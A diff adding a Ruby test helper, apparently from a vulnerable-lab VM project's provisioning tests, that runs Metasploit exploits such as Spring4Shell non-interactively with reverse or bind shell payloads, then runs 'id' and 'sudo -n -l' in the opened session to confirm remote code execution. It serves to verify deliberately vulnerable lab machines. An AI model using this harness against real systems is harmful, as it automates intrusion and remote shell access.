@@ -709,6 +709,136 @@ class PostProvisionTest
                        expect_privilege, tier)
   end
 
+  # --- Metasploit exploit helper, session payload (tier 3) ----------------
+  # Drive a Metasploit *remote* exploit whose only usable payloads open an
+  # interactive session (no cmd/sentinel payload exists), then prove RCE by
+  # running a command *inside that session* and reading its output back.
+  #
+  # Some modules (e.g. Spring4Shell,
+  # exploit/multi/http/spring_framework_rce_spring4shell) are only compatible
+  # with interactive shell payloads such as java/jsp_shell_bind_tcp or
+  # java/jsp_shell_reverse_tcp — there is no command payload for
+  # test_msf_exploit's sentinel model to use. This helper fills that gap: it runs
+  # the exploit with a session payload, backgrounds the session (run -z, so
+  # msfconsole does not drop into interaction and hang), waits for it to open,
+  # runs verify_cmd in the session with `sessions -c` (a shell command across the
+  # live sessions), then reads the console output back.
+  #
+  # Proof of RCE is a `uid=` line in that session output (same signal as the
+  # sentinel helpers, via sentinel_pwned?). expect_privilege is honoured exactly
+  # as in record_rce_outcome/privilege_matches? — `id`'s uid/groups plus a
+  # captured `sudo -n -l` tell a root/sudoer shell from a plain user. The full
+  # msfconsole output is filed as evidence like the other helpers.
+  #
+  # payload:          java/jsp_shell_bind_tcp (default) or java/jsp_shell_reverse_tcp.
+  #                   For a bind payload LPORT is the port the target listens on;
+  #                   for a reverse payload LHOST is auto-set to the attacker IP
+  #                   (mirroring how test_msf_exploit auto-sets FETCH_SRVHOST).
+  # force:            sets ForceExploit, for modules whose automatic check
+  #                   false-negatives on a genuinely vulnerable build.
+  # options:          extra msf datastore settings (e.g. TARGETURI, TARGET);
+  #                   RHOSTS/RPORT/PAYLOAD/LPORT (and LHOST for a reverse payload)
+  #                   are set for you. A TARGET here is emitted before PAYLOAD so a
+  #                   non-default target keeps a compatible payload.
+  # verify_cmd:       the shell command run inside the session; its stdout must
+  #                   carry the uid= proof (default 'id; uname -n').
+  #
+  # The payload must be one that actually runs on the target: the stock java JSP
+  # shells (jsp_shell_bind/reverse_tcp) are the module's default, but on some
+  # builds Tomcat's Jasper compiler rejects their fragmented local-class JSP, so a
+  # native session via the module's dropper target lands more reliably — e.g. for
+  # Spring4Shell on Tomcat 8.5.77, TARGET 1 (Linux) with a linux reverse shell:
+  #
+  #   test_msf_exploit_session('exploit/multi/http/spring_framework_rce_spring4shell',
+  #                            rport: 8080, options: { 'TARGETURI' => '/', 'TARGET' => 1 },
+  #                            force: true, payload: 'linux/x64/shell_reverse_tcp')
+  def test_msf_exploit_session(msf_module, rhost: nil, rport: self.port, attacker: nil,
+                               payload: 'java/jsp_shell_bind_tcp', lport: 4444,
+                               options: {}, force: false, tier: 3, label: nil,
+                               expect_privilege: nil, verify_cmd: 'id; uname -n')
+    name = label || "msf exploit session (#{msf_module})"
+    validate_expect_privilege!(expect_privilege)
+    resolved = resolve_attacker(name, attacker, rhost, tier)
+    return unless resolved
+    attacker, attacker_ip, rhost = resolved
+
+    reverse = payload.to_s.include?('reverse')
+    opts = options.map { |k, v| [k.to_s, v] }.to_h
+    settings = { 'RHOSTS' => rhost, 'RPORT' => rport }
+    # TARGET (if the caller selects one, e.g. a dropper target) must be set before
+    # PAYLOAD: changing the target afterwards can drop an incompatible payload, so
+    # emit it first. Ruby hashes keep insertion order, which is the order of the
+    # msf `set` lines.
+    settings['TARGET'] = opts.delete('TARGET') if opts.key?('TARGET')
+    settings['PAYLOAD'] = payload
+    settings['LPORT'] = lport
+    # A reverse shell connects back to the attacker; a bind shell listens on the
+    # target, so LHOST is irrelevant there.
+    settings['LHOST'] = attacker_ip if reverse
+    settings['ForceExploit'] = true if force
+    settings.merge!(opts)
+    set_lines = settings.map { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')
+
+    # The command we run inside the session. `id` gives the uid= proof and the
+    # groups=... privilege_matches? reads; when asserting privilege we also
+    # capture `sudo -n -l` so a passwordless sudoer is told from a plain user
+    # (exactly as test_msf_exploit does for its sentinel).
+    verify = verify_cmd.to_s
+    if expect_privilege
+      verify = "#{verify}; echo secgen_sudo_begin; sudo -n -l 2>/dev/null; echo secgen_sudo_end"
+    end
+
+    # One non-interactive msfconsole run:
+    #   1. run -z launches the exploit and backgrounds the resulting session
+    #      WITHOUT interacting (a plain `run` would drop us into the shell and
+    #      block until the guest-agent timeout, returning nothing).
+    #   2. sleep lets the JSP webshell deploy and the session register.
+    #   3. sessions -l records whether a session opened (evidence on failure).
+    #   4. sessions -c '<verify>' runs the command across the live session(s);
+    #      its output is printed to the console, which we read back and scan for
+    #      uid=. msf_set_value single-quotes the command, and msfconsole's -x
+    #      splitter respects single quotes (the same reason test_msf_exploit can
+    #      put ';' inside a quoted CMD), so the whole verify line reaches the
+    #      session's shell as one argument.
+    session_wait = (ENV['SECGEN_MSF_SESSION_WAIT'] || 25).to_i
+    msf = "export HOME=/root TERM=dumb; msfconsole -q -x \"use #{msf_module}; " \
+          "#{set_lines} run -z; sleep #{session_wait}; sessions -l; " \
+          "sessions -c #{msf_set_value(verify)}; exit -y\""
+    result = run_on_system(attacker, msf, timeout: (ENV['SECGEN_MSF_TIMEOUT'] || 600).to_i)
+    msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
+    add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-6000..-1] || msf_out)}")
+
+    # The session command's output lands in the msfconsole console output, so
+    # the whole captured output is the "body" record_rce_outcome's predicates
+    # (sentinel_pwned?/privilege_matches?) parse for uid=/groups=/sudo. Recorded
+    # inline (not via record_rce_outcome) because there is no sentinel file here;
+    # the proof is the live session output itself.
+    record_session_rce_outcome(name, msf_out,
+                               "RCE confirmed: #{msf_module} from #{attacker} (#{attacker_ip}) opened an interactive session on the target (#{rhost}) and ran a command in it",
+                               expect_privilege, tier)
+  end
+
+  # PASS/FAIL once an interactive-session exploit's command output has been read
+  # back. Mirrors record_rce_outcome but names the live session shell as the
+  # proof (there is no sentinel file). PASS when the output proves RCE (uid=)
+  # and, if expect_privilege is given, the shell's privilege matches.
+  def record_session_rce_outcome(name, body, success_prefix, expect_privilege, tier)
+    unless sentinel_pwned?(body)
+      return fail_check(name,
+                        'Exploit did not confirm RCE: the session shell produced no uid= line (session may not have opened). See msf_output evidence.',
+                        tier: tier)
+    end
+    if expect_privilege && !privilege_matches?(body, expect_privilege)
+      fail_check(name,
+                 "RCE confirmed, but the shell's privilege does not match the module's <privilege>=#{expect_privilege}: session shows #{body[/uid=\S+/]}#{privilege_note(body)}. Expected #{{ 'uid0' => 'a root shell (uid=0)' }.fetch(expect_privilege.to_s) { expect_privilege.to_s =~ /user/ ? 'a non-root, non-sudoer shell' : 'a root or sudoer shell' }}.",
+                 tier: tier)
+    else
+      pass_check(name,
+                 "#{success_prefix}; session shell returned #{body[/uid=\S+/]}#{expect_privilege ? " — <privilege>=#{expect_privilege} verified#{privilege_note(body)}" : ''}.",
+                 tier: tier)
+    end
+  end
+
   # Shared PASS/FAIL recording once a sentinel has been read back for an exploit
   # helper. PASS when it proves RCE (uid=) and, if expect_privilege is given, the
   # shell's privilege matches the module's <privilege>; FAIL otherwise.
